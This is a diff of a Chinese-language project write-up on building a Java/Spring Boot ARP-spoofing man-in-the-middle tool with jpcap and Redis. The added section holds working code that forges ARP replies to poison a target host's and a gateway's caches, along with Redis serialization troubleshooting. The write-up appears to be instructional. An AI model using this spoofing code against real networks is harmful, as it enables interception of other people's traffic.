@@ -402,15 +402,9 @@ TCP报文段应该非常熟悉了，不再解释。解析结果如下：
 
 
 
-### 5.1 jpcap再封装
-
-原本的jpcap包访问封装性较差，数据成员可以直接被外部访问，因此我在此对其加一层封装，提高其安全性并添加可扩展性。代码相对简单，只需要对照着jpcap中的各个类编写相应的封装类即可。数据包类的继承关系如下图所示：
-
-![image-20210323211551426](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210323211551426.png)
 
 
-
-### 5.2 替换Dao
+### 5.1 替换Dao
 
 该[项目](https://github.com/hustakin/jpcap-mitm)采用MongoDB作为数据存储引擎，我将其更换成了Redis。如果我们使用默认的`Redis`配置，由于springboot只提供了`RedisTemplate<Object, Object>`和`StringRedisTemplate`两种模版，因此只支持`string`类型的序列化器。但是我们需要将对象序列化到redis中，所以需要自定义`redisTemplate`，并配置序列化器。
 
@@ -532,7 +526,7 @@ public class RedisMapper {
 
 ```
 
-### 5.3 AttackConfig
+### 5.2 AttackConfig
 
 由于ARP spoof的需求，我们需要获取到以下信息：
 
@@ -577,7 +571,7 @@ public void initDefaultConfig(){
 
 `Constructor`(构造方法) -> `@Autowired`(依赖注入) -> `@PostConstruct`(注释的方法)
 
-### 5.4 获取网卡列表
+### 5.3 获取网卡列表
 
 编写`AttackController`，获取网卡列表，并序列化返回给前端。
 
@@ -622,7 +616,7 @@ public class AttackController {
 
 
 
-### 5.5 接口对接测试
+### 5.4 接口对接测试
 
 既然已经编写好了一个接口，那么我们就尝试着跟前端模块对接一下，防止项目庞大后对接问题的堆积。
 
@@ -634,11 +628,121 @@ public class AttackController {
 
 ![image-20210324204458217](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204458217.png)
 
-结果：前端成功获取到了网卡名称数据。
+结果：前端成功获取并显示了所有网卡名称。
 
 ![image-20210324204611650](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204611650.png)
 
 
 
-### 5.6 JpcapCaptor
+### 5.5 攻击核心代码
+
+此项目的核心功能就是对抓取的网络数据包进行一系列操作，如分组、拼接、解压、还原等。所以就不再描述其他细节问题，重点讲讲上述核心功能的实现。
+
+首先，在前端页面上初次填写攻击配置信息（srcIP, dstIP, gateIP等）后，点击setup configs按钮，后端会接收到一个路径为`attack/updateConfigAndOpenDevice`的请求。随即根据表单的数据更新攻击配置信息（存入redis），然后根据配置信息选择网卡，并调用以下两个来自Jpcap包的方法打开网卡设备：
+
+```java
+public static jpcap.JpcapCaptor openDevice(jpcap.NetworkInterface intrface, int snaplen, boolean promisc, int to_ms) throws java.io.IOException
+public jpcap.JpcapSender getJpcapSenderInstance()
+```
+
+然后等待前端下达指令就开始抓包。
+
+![image-20210325192544852](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210325192544852.png)
+
+这里遇到了一个问题，我在使用redisTemplate从redis从get配置信息的时候报错，如下：
+
+```shell
+java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.XXX.XXX.xxClass
+```
+
+从redis反序列化出来的时候，所有的对象都变成了LinkedHashMap。
+
+查了资料，原因是：在配置redisconfig的时候，我定义的MyObjectMapper没有配置`DefaultTyping`属性，jackson将使用简单的数据绑定具体的java类型，其中Object就会在反序列化的时候变成LinkedHashMap。如何解决呢？
+
+解决办法就是在get之后用`ObjectMapper`来转换：
+
+```java
+public Object get(KeyPrefix prefix, String key, Class<?> clazz){
+  String realKey = prefix.getPrefix().concat(key);
+  ObjectMapper mapper = new ObjectMapper();
+  return mapper.convertValue(redisTemplate.opsForValue().get(realKey), clazz);
+}
+```
+
+但是问题应该是出在`RedisConfig`的配置中，先不处理它。
+
+接下来开始编写攻击代码，攻击走的请求路径是`/attack/startAttack`，所以我们在`AttackController`中编写攻击的代码：
+
+```java
+@GetMapping("/startAttack")
+@ResponseBody
+public ResultDTO startAttacking(){
+  logger.info("start attacking");
+  attackService.attack();
+  return new ResultDTO(true);
+}
+```
+
+去调用Service层的`attack`方法执行攻击流程。
+
+首先是创建用于spoofing的ARP包：
+
+1. 创建一个ARP包发送给目标主机，将自己伪装成网关；
+2. 创建一个ARP包发送给网关，将自己伪装成目标主机。
+
+```java
+public synchronized void attack(){
+  //当前处于攻击状态，说明已经有线程在攻击了，所以当前线程直接返回
+  if(attacking)   return;
+  attacking = true;
+
+  startAttackTimeStamp = new Date();//记录当前时间
+  //为了方便统计数据，我们为每次攻击都设置一个批次ID，即batchId
+  //这个batchId需要是自增的，如何获取一个自增的batchId呢？
+  //那就还从redis里取，但是这个batchId必须跟每次攻击的数据包对应好，否则就乱了
+  //OK，那我们就在初始化Servlet的时候，就在Redis里设置一个存id的键，如果不存在，那就创建一个，具体操作见方法initBatchId
+  batchId = (Integer) redisMapper.get(CommonKey.COMMON_KEY, "batch_id", Integer.class);
+  //这里没考虑并发修改redis的batchId的问题，因为同一时间只有一个线程会执行攻击方法
+  //因为AttackService默认是单例的，锁上之后，别的线程也没法调用attack方法，也就不会并发修改batchId
+  //但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx
+  //这里就不实现了
+  batchId++;
+
+  //设置ARP包欺骗目标主机，将自己伪装成网关
+  ARPPacket arpToDst = createARPPacket(srcMACBT, gateIPIA.getAddress(), dstMACBT, dstIPIA.getAddress());
+
+
+  //设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址
+  //这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上
+  ARPPacket arpToGate = createARPPacket(srcMACBT, dstIPIA.getAddress(), gateMACBT, gateIPIA.getAddress());
+
+	...
+}
+```
+
+创建ARP包的方法如下：
+
+```java
+private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHardAddr, byte[] tProtoAddr){
+  ARPPacket arpPacket = new ARPPacket();
+  arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
+  arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
+  arpPacket.operation = ARPPacket.ARP_REPLY;//设置操作类型为应答
+  arpPacket.hlen = 6;//硬件地址长度
+  arpPacket.plen = 4;//协议类型长度
+  arpPacket.sender_hardaddr = sHardAddr;//发送端MAC地址
+  arpPacket.sender_protoaddr = sProtoAddr;//发送端IP地址
+  arpPacket.target_hardaddr = tHardAddr;//目标MAC地址
+  arpPacket.target_protoaddr = tProtoAddr;//目标IP地址
+
+  //定义以太网首部
+  EthernetPacket ethernetPacket = new EthernetPacket();
+  ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;//设置帧类型为ARP帧
+  ethernetPacket.src_mac = sHardAddr;//源MAC地址
+  ethernetPacket.dst_mac = tHardAddr;//目标MAC地址
+  //添加以太网首部
+  arpPacket.datalink = ethernetPacket;
+  return arpPacket;
+}
+```
 
